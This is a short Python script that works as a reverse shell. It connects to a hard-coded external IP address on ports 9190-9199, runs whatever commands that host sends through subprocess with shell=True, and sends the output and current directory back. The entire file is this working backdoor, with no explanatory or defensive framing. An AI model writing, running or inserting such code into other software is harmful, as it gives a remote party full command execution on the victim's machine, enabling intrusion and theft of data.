import socket
import os
import subprocess


s = socket.socket()
#host = '192.168.0.101'
host = '3.17.167.53'
ports = [ports for ports in range(9190,9200)]
for port in ports:
    try:
        s.connect((host,port))
    except:
        pass

while True:
    data = s.recv(96000)
    if data[:2].decode('utf-8') == 'cd':
        try:
            os.chdir(data[3:].decode('utf-8'))
        except FileNotFoundError:
            pass

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,'utf-8')
        path = os.getcwd() + '> '
        s.send(str.encode(output_str + path))

        print(output_str)

